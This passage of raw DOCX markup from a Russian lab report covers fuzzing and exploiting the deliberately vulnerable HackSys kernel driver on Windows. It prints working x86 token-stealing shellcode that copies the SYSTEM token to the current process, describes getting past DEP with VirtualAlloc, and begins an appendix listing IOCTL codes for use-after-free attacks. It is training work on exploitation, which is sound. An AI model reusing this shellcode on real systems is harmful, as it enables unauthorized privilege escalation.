        <w:t>атем сместиться на 12 байт, ввести 4 байта по полученному адресу, а затем сместиться</w:t>
      </w:r>
      <w:r w:rsidR="00033F36">
        <w:t xml:space="preserve"> там</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> еще на 16, так как функция, на которой стоит бряк, возвращает другую функцию и передает туда буфер со смещением 16</w:t>
      </w:r>
      <w:r w:rsidR="00033F36">
        <w:t>. И перейти по адресу, к которому подошли при смещении.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A5C1D7" w14:textId="77777777" w:rsidR="00E35D02" w:rsidRDefault="00E35D02" w:rsidP="000D0663"/>
    <w:p w14:paraId="256C6F4A" w14:textId="77777777" w:rsidR="00E35D02" w:rsidRDefault="00E35D02" w:rsidP="00E35D02">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B94998E" wp14:editId="0B60555E">
            <wp:extent cx="6300470" cy="3169920"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="55054231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42311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B0BF" w14:textId="32772E7D" w:rsidR="00E35D02" w:rsidRPr="00A64AE6" w:rsidRDefault="00E35D02" w:rsidP="00E35D0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27</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Нахождение строки в памяти</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF9D239" w14:textId="77777777" w:rsidR="000D0663" w:rsidRPr="000D0663" w:rsidRDefault="000D0663" w:rsidP="000D0663"/>
    <w:p w14:paraId="24D91FA8" w14:textId="0E8E2BC6" w:rsidR="000D0663" w:rsidRPr="000D0663" w:rsidRDefault="002A7967" w:rsidP="002A7967">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4.</w:t>
      </w:r>
      <w:r w:rsidRPr="000B6B46">
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Написание </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>фаззера</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7658F789" w14:textId="0E9D4BE4" w:rsidR="000D0663" w:rsidRDefault="002A7967" w:rsidP="000D0663">
      <w:r>
        <w:t xml:space="preserve">Основа </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>фаззера</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> была взята из лабораторной работы №2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3FA783" w14:textId="678A69F7" w:rsidR="002A7967" w:rsidRDefault="002A7967" w:rsidP="000D0663">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Фаззер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> подставляет различные коды управления и осуществляет мутацию буфера.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEDEB46" w14:textId="1295A92E" w:rsidR="002A7967" w:rsidRPr="00A74B4F" w:rsidRDefault="002A7967" w:rsidP="000D0663">
      <w:r>
        <w:t>Перебор случайных кодов не да</w:t>
      </w:r>
      <w:r w:rsidR="00A74B4F">
        <w:t>л</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результата, так как в исходном коде было замечено, что обрабатывается случай исключительно с одним кодом 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidRPr="002A7967">
        <w:t>222403.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Поэтому далее рассматривается только этот код.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8BCB7A" w14:textId="77777777" w:rsidR="002A7967" w:rsidRPr="00A74B4F" w:rsidRDefault="002A7967" w:rsidP="000D0663"/>
    <w:p w14:paraId="2EBD2BDF" w14:textId="77777777" w:rsidR="002A7967" w:rsidRDefault="002A7967" w:rsidP="002A7967">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38B5D179" wp14:editId="6A12E5F5">
            <wp:extent cx="6300470" cy="3847465"/>
            <wp:effectExtent l="0" t="0" r="5080" b="635"/>
            <wp:docPr id="417886908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6908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D5E1" w14:textId="7E63A536" w:rsidR="002A7967" w:rsidRPr="00AC3BB7" w:rsidRDefault="002A7967" w:rsidP="002A796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28</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Подстановка различных кодов управления</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663CDFCC" w14:textId="77777777" w:rsidR="000B6B46" w:rsidRPr="00AC3BB7" w:rsidRDefault="000B6B46" w:rsidP="000B6B46"/>
    <w:p w14:paraId="553C4999" w14:textId="04E05F4F" w:rsidR="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46">
      <w:r>
        <w:t xml:space="preserve">При вводе различных данных </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>фаззер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> на 5 итерации смог выполнить переполнение буфера.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAE688E" w14:textId="77777777" w:rsidR="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46"/>
    <w:p w14:paraId="359C09CF" w14:textId="77777777" w:rsidR="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09B36411" wp14:editId="66B6F21E">
            <wp:extent cx="5587169" cy="3362325"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="210649146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146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1103" cy="33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5C7A" w14:textId="0123C7CB" w:rsidR="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B4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29</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Падение программы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3368EB1A" w14:textId="77777777" w:rsidR="007266B5" w:rsidRDefault="007266B5" w:rsidP="007266B5"/>
    <w:p w14:paraId="5015DE5C" w14:textId="77777777" w:rsidR="007266B5" w:rsidRDefault="007266B5" w:rsidP="007266B5">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6080C162" wp14:editId="4CF3702E">
            <wp:extent cx="6300470" cy="5459730"/>
            <wp:effectExtent l="0" t="0" r="5080" b="7620"/>
            <wp:docPr id="60353222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3222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079" w14:textId="0F1F7996" w:rsidR="007266B5" w:rsidRDefault="007266B5" w:rsidP="007266B5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30</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Анализ ошибки</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1072C303" w14:textId="77777777" w:rsidR="00C47385" w:rsidRDefault="00C47385" w:rsidP="00C47385"/>
    <w:p w14:paraId="60603EB4" w14:textId="77777777" w:rsidR="00C47385" w:rsidRDefault="00C47385" w:rsidP="00C47385">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76408CD7" wp14:editId="780A2E97">
            <wp:extent cx="6300470" cy="4746625"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="4666831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31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85F6" w14:textId="4CE8EF2B" w:rsidR="00C47385" w:rsidRPr="00C47385" w:rsidRDefault="00C47385" w:rsidP="00C47385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– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>BSOD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AD825C" w14:textId="77777777" w:rsidR="007266B5" w:rsidRPr="007266B5" w:rsidRDefault="007266B5" w:rsidP="007266B5"/>
    <w:p w14:paraId="5F098EE2" w14:textId="6A35B5B8" w:rsidR="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t>Эксплуатация уязвимости</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B7EA0D" w14:textId="318EA0DC" w:rsidR="000B6B46" w:rsidRDefault="009238F0" w:rsidP="009238F0">
      <w:r>
        <w:t>В исходном коде максимальная длина буфера = 2048. При большем объеме буфер</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t>а</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> перезаписывается адрес возврата</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t xml:space="preserve"> функции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t xml:space="preserve">Из-за DEP </w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t>нельзя</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> просто выполнять</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t xml:space="preserve"> случайные</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> инструкции, передаваемые непосредственно в стек, за исключением инструкций возврата. </w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t xml:space="preserve">Для обхода </w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DEP</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32">
        <w:t xml:space="preserve"> была использована функция</w:t>
      </w:r>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> Vir</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t>tualAlloc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A70D32" w:rsidRPr="00A70D32">
        <w:t>() для выделения нового блока исполняемой памяти и копирования в него шелл-кода для выполнения.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6D749D" w14:textId="76BE3AD7" w:rsidR="00A70D32" w:rsidRDefault="00A70D32" w:rsidP="00A70D32">
      <w:r>
        <w:t xml:space="preserve">Написанный </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>шеллкод</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:t xml:space="preserve">сохраняет состояние регистра, находит токен текущего процесса и сохраняет его, затем находит </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A70D32">
        <w:t>pid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>системного</w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> процесса, извлекает токен </w:t>
      </w:r>
      <w:r>
        <w:t>системного</w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> процесса, заменяет токен текущего процесса на токен </w:t>
      </w:r>
      <w:r>
        <w:t>системного</w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:t xml:space="preserve"> процесса и восстанавливает регистры</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6E93A1" w14:textId="77777777" w:rsidR="00A70D32" w:rsidRDefault="00A70D32" w:rsidP="00A70D32">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35EFA693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FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>unsigned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70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>char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shellcode[] =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D61C96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"\x60"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pushad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="42136F66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"\x31\xc0"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eax,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7EA56BC6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"\x64\x8b\x80\x24\x01\x00\x00"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>,[fs:eax+0x124]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B249553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"\x8b\x40\x50"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>,[eax+0x50]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35815783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"\x89\xc1"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ecx,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E070592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 w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>xba</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>\x04\x00\x00\x00"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>// mov edx,0x4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6D88BC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"\x8b\x80\xb8\x00\x00\x00"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>,[eax+0xb8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B234DD8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"\x2d\xb8\x00\x00\x00"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>// sub eax,0xb8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546E1E20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"\x39\x90\xb4\x00\x00\x00"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cmp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 xml:space="preserve"> [eax+0xb4],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</w:p>
    <w:p w14:paraId="1F86967B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"\x75\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>xed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>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jnz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 xml:space="preserve"> 0x1a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0947B2E5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"\x8b\x90\xf8\x00\x00\x00"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>,[eax+0xf8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA6B63D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"\x89\x91\xf8\x00\x00\x00"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70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>// mov [ecx+0xf8],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</w:p>
    <w:p w14:paraId="7CA9FABA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"\x61"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popad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2004B718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"\x31\xc0"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 w:rsidRPr="00A70D32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eax,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6FF0E191" w14:textId="77777777" w:rsidR="00A70D32" w:rsidRPr="00A70D32" w:rsidRDefault="00A70D32" w:rsidP="00A70D32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"\x5d"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 xml:space="preserve">// pop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>ebp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="78FD4824" w14:textId="070A6D51" w:rsidR="00A70D32" w:rsidRPr="00A70D32" w:rsidRDefault="00A70D32" w:rsidP="00A70D32">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="00A70D32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70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>"\xc2\x08\x00"</w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">;          </w:t>
      </w:r>
      <w:r w:rsidRPr="00A70D32">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>// ret 0x8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562EDE0D" w14:textId="77777777" w:rsidR="000B6B46" w:rsidRPr="00A70D32" w:rsidRDefault="000B6B46" w:rsidP="000B6B46">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7040861D" w14:textId="0A22E3D5" w:rsidR="000B6B46" w:rsidRDefault="00A70D32" w:rsidP="000B6B46">
      <w:r>
        <w:t xml:space="preserve">Полученный </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>шеллкод</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> подгружается с помощью функции </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A70D32">
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> и позволяет вызывать любую команду от лица администратора.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD26FBE" w14:textId="77777777" w:rsidR="00A70D32" w:rsidRDefault="00A70D32" w:rsidP="000B6B46"/>
    <w:p w14:paraId="2505E292" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="009B5E44" wp14:editId="1A4A3FE0">
            <wp:extent cx="6300470" cy="3543935"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="2046957990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7990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BEB3" w14:textId="3771437E" w:rsidR="00A70D32" w:rsidRPr="00A70D32" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB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47385">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>32</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Успешное выполнение эксплойта</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2935DFBD" w14:textId="77777777" w:rsidR="0036219A" w:rsidRPr="00A70D32" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="379B9753" w14:textId="5FB5863B" w:rsidR="0036219A" w:rsidRPr="00C93DCC" w:rsidRDefault="0036219A" w:rsidP="0036219A">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Вывод</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC6EB9D" w14:textId="17B5C030" w:rsidR="00AC3BB7" w:rsidRDefault="00D65044" w:rsidP="00BE6394">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Были изучены типовые уязвимости в драйверах режима ядра ОС </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="0036219A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>и способы их эксплуатации. Были освоены навыки отладки драйверов и анализа падений системы.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329AA357" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E413C5E" w14:textId="41407465" w:rsidR="00601F8B" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="afb"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Приложение А</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7F51F1" w14:textId="08F02C69" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:r>
        <w:t>Листинг программы для отправки сообщений драйверу</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5699DD94" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7"/>
    <w:p w14:paraId="7FE53E6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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>stdio.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1897939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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>Windows.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A06CFAC" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4259A09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HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x00222413</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0372E06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HACKSYS_EVD_IOCTL_USE_UAF_OBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x00222417</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6916B81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HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x0022241B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A01AF3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HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x0022241F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4436ADA6" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00B09D3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typedef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struct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_UNICODE_STRING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128AF2C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7790D34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WORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Length;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A060A0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WORD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MaximumLength</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BA4A8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WORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>* Buffer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CA4DE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 xml:space="preserve">} </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>UNICODE_STRING</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, * </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>PUNICODE_STRING</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011A57A1" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AA0796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typedef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struct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_OBJECT_ATTRIBUTES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295D596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7D3C921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ULONG</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Length;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BCB6D3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PVOID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RootDirectory</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBE80E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PUNICODE_STRING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ObjectName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506456B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ULONG</w:t>
      </w:r>
